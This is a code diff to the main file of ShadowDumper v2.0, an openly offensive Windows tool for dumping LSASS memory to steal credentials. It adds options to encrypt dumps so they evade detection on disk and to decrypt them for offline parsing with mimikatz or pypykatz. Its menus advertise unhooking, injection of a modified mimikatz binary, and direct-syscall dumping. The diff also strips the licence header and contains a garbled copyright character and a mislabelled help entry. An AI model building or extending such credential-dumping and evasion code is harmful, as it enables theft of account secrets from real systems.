@@ -1,26 +1,8 @@
-/*
- * © 2024 Usman Sikander - Offensive Panda
- *
- * This software is provided under the MIT License.
- * Permission is hereby granted, free of charge, to any person obtaining a copy of this software
- * and associated documentation files (the "Software"), to deal in the Software without restriction,
- * including without limitation the rights to use, copy, modify, merge, publish, distribute,
- * sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in all copies or
- * substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING
- * BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
- * NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
- * DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
- */
-
 #define _CRT_SECURE_NO_WARNINGS // Suppress security warnings
 
 #include <iostream>
+#include <limits>
+#define NOMINMAX
 #include <windows.h>
 #include <string>
 #include <functional>
@@ -50,7 +32,7 @@ void DisplayLogo() {
     SetConsoleColor(MAGENTA);
     std::cout << "*****************************************************************************" << std::endl;
     SetConsoleColor(CYAN);
-    std::cout << "*       WELCOME TO MULTI-METHOD LSASS DUMPING TOOL (SHADOW DUMPER v1.0)         *" << std::endl;
+    std::cout << "*       WELCOME TO MULTI-METHOD LSASS DUMPING TOOL (SHADOW DUMPER v2.0)         *" << std::endl;
     SetConsoleColor(YELLOW);
     std::cout << "*            Created by Usman Sikander (a.k.a offensive-panda)    *" << std::endl;
     SetConsoleColor(MAGENTA);
@@ -62,20 +44,21 @@ void DisplayMenu() {
     SetConsoleColor(GREEN);
     std::cout << "\n*******************************" << std::endl;
     SetConsoleColor(CYAN);
-    std::cout << "ShadowDumper: A powerful tool created in C/C++ to dump LSASS memory using multiple advanced techniques © Offensive-Panda" << std::endl;
+    std::cout << "ShadowDumper: A powerful tool created in C/C++ to dump LSASS memory using multiple advanced techniques � Offensive-Panda" << std::endl;
     SetConsoleColor(YELLOW);
     std::cout << "Note: All Dump files will be stored in C:\\Users\\Public" << std::endl;
     SetConsoleColor(YELLOW);
     std::cout << "*******************************" << std::endl;
     SetConsoleColor(GREEN);
     std::cout << "\nSelect an option to proceed:" << std::endl;
-    std::cout << "1. To dump lsass memory using unhooking technique to inject modified mimikatz binary." << std::endl;
+    std::cout << "1. To dump lsass memory using unhooking technique to inject modified mimikatz binary [Token Elevation, SAM Dumping, Vault Credentials, Lsass Hashes Dumping]. " << std::endl;
     std::cout << "2. To dump lsass memory using unhooking technique to inject binary using direct syscalls with MDWD." << std::endl;
     std::cout << "3. To dump lsass memory using simple MiniDumpWriteDump API." << std::endl;
-    std::cout << "4. To dump lsass memory using MINIDUMP_CALLBACK_INFORMATION callbacks. " << std::endl;
-    std::cout << "5. To dump lsass memory using process forking technique." << std::endl;
+    std::cout << "4. To dump lsass memory using MINIDUMP_CALLBACK_INFORMATION callbacks and encrypt the dumps before writing on disk as per your choice. " << std::endl;
+    std::cout << "5. To dump lsass memory using process forking technique and encrypt the dumps before writing on disk as per your choice." << std::endl;
     std::cout << "6. To dump lsass memory using direct syscalls with MiniDumpWriteDump." << std::endl;
     std::cout << "7. To dump lsass memory using direct syscalls (native dump with needed streams for parsing offline)." << std::endl;
+    std::cout << "8. To decrypt the dump file before offline parsing with tools like (mimikatz or pypykatz)." << std::endl;
     std::cout << "0. Exit" << std::endl;
     SetConsoleColor(WHITE);
 }
@@ -125,27 +108,65 @@ void ExecuteTask(int option) {
         }
         break;
     case 4:
-        if (callbacksMDWD()) {
-            SetConsoleColor(CYAN);
-            std::cout << "Happy Hacking.....Enjoy Dump!" << std::endl;
-            exit(0);
-        }
-        else {
-            SetConsoleColor(RED);
-            std::cout << "Failed to dump lsass....oops!" << std::endl;
-            exit(0);
+        std::cout << "Do you want to encrypt the dump before writing on disk [yes/no]: ";
+        {
+            std::string response;
+            std::cin >> response;
+            if (response == "yes" || response == "y" || response == "Y") {
+                if (callbacksMDWD(true)) {
+                    SetConsoleColor(CYAN);
+                    std::cout << "Happy Hacking.....Enjoy Encrypted Dump!" << std::endl;
+                    exit(0);
+                }
+                else {
+                    SetConsoleColor(RED);
+                    std::cout << "Failed to dump and encrypt data....oops!" << std::endl;
+                    exit(0);
+                }
+            }
+            else {
+                if (callbacksMDWD()) {
+                    SetConsoleColor(CYAN);
+                    std::cout << "Lsass memory dumped successfully without encryption!" << std::endl;
+                    exit(0);
+                }
+                else {
+                    SetConsoleColor(RED);
+                    std::cout << "Failed to dump data....oops!" << std::endl;
+                    exit(0);
+                }
+            }
         }
         break;
     case 5:
-        if (reflectDump()) {
-            SetConsoleColor(CYAN);
-            std::cout << "Happy Hacking.....Enjoy Dump!" << std::endl;
-            exit(0);
-        }
-        else {
-            SetConsoleColor(RED);
-            std::cout << "Failed to dump lsass....oops!" << std::endl;
-            exit(0);
+        std::cout << "Do you want to encrypt the dump before writing on disk [yes/no]: ";
+        {
+            std::string response;
+            std::cin >> response;
+            if (response == "yes" || response == "y" || response == "Y") {
+                if (reflectDump(true)) {
+                    SetConsoleColor(CYAN);
+                    std::cout << "Happy Hacking.....Enjoy Encrypted Dump!" << std::endl;
+                    exit(0);
+                }
+                else {
+                    SetConsoleColor(RED);
+                    std::cout << "Failed to dump and encrypt data....oops!" << std::endl;
+                    exit(0);
+                }
+            }
+            else {
+                if (reflectDump()) {
+                    SetConsoleColor(CYAN);
+                    std::cout << "Lsass memory dumped successfully without encryption!" << std::endl;
+                    exit(0);
+                }
+                else {
+                    SetConsoleColor(RED);
+                    std::cout << "Failed to dump data....oops!" << std::endl;
+                    exit(0);
+                }
+            }
         }
         break;
     case 6:
@@ -172,6 +193,31 @@ void ExecuteTask(int option) {
             exit(0);
         }
         break;
+    case 8:
+        SetConsoleColor(YELLOW);
+        wchar_t inputFilePath[MAX_PATH];
+        wchar_t outputFilePath[MAX_PATH];
+
+        std::wcin.ignore(std::numeric_limits<std::streamsize>::max(), L'\n');
+        // Prompt user for input file path
+        std::wcout << L"Enter the input file path: ";
+        std::wcin.getline(inputFilePath, MAX_PATH); // Read input directly
+
+        // Prompt user for output file path
+        std::wcout << L"Enter the output file path: ";
+        std::wcin.getline(outputFilePath, MAX_PATH); // Read input directly
+
+        if (DecryptDumpFile(inputFilePath, outputFilePath)) {
+            SetConsoleColor(CYAN);
+            std::wcout << L"Decryption completed successfully.......Enjoy Dump!" << std::endl;
+            exit(0);
+        }
+        else {
+            SetConsoleColor(RED);
+            std::wcout << L"Failed to decrypt the file. Please try again." << std::endl;
+            exit(0);
+        }
+        break;
     default:
         SetConsoleColor(RED);
         std::cout << "Invalid option! Please choose a valid option." << std::endl;
@@ -186,19 +232,21 @@ void DisplayHelp() {
     SetConsoleColor(CYAN);
     std::cout << "Options:" << std::endl;
     SetConsoleColor(YELLOW);
-    std::cout << "  ShadowDumper.exe 1            To dump lsass memory using unhooking technique to inject modified mimikatz binary." << std::endl;
+    std::cout << "  ShadowDumper.exe 1            To dump lsass memory using unhooking technique to inject modified mimikatz binary [Token Elevation, SAM Dumping, Vault Credentials, Lsass Hashes Dumping]." << std::endl;
     SetConsoleColor(RED);
     std::cout << "  ShadowDumper.exe 2            To dump lsass memory using unhooking technique to inject binary using direct syscalls with MDWD." << std::endl;
     SetConsoleColor(GREEN);
     std::cout << "  ShadowDumper.exe 3            To dump lsass memory using simple MiniDumpWriteDump API." << std::endl;
     SetConsoleColor(CYAN);
-    std::cout << "  ShadowDumper.exe 4            To dump lsass memory using MINIDUMP_CALLBACK_INFORMATION callbacks." << std::endl;
+    std::cout << "  ShadowDumper.exe 4            To dump lsass memory using MINIDUMP_CALLBACK_INFORMATION callbacks and encrypt the dumps before writing on disk as per your choice." << std::endl;
     SetConsoleColor(YELLOW);
-    std::cout << "  ShadowDumper.exe 5            To dump lsass memory using process forking technique." << std::endl;
+    std::cout << "  ShadowDumper.exe 5            To dump lsass memory using process forking technique and encrypt the dumps before writing on disk as per your choice." << std::endl;
     SetConsoleColor(RED);
     std::cout << "  ShadowDumper.exe 6            To dump lsass memory using direct syscalls with MiniDumpWriteDump." << std::endl;
     SetConsoleColor(GREEN);
-    std::cout << "  ShadowDumper.exe 7            To dump lsass memory using direct syscalls (native dump with needed streams for parsing offline)" << std::endl;
+    std::cout << "  ShadowDumper.exe 7            To dump lsass memory using direct syscalls (native dump with needed streams for parsing offline)." << std::endl;
+    SetConsoleColor(CYAN);
+    std::cout << "  ShadowDumper.exe 7            To decrypt the dump file before offline parsing with tools like (mimikatz or pypykatz)." << std::endl;
     SetConsoleColor(GREEN);
 
 
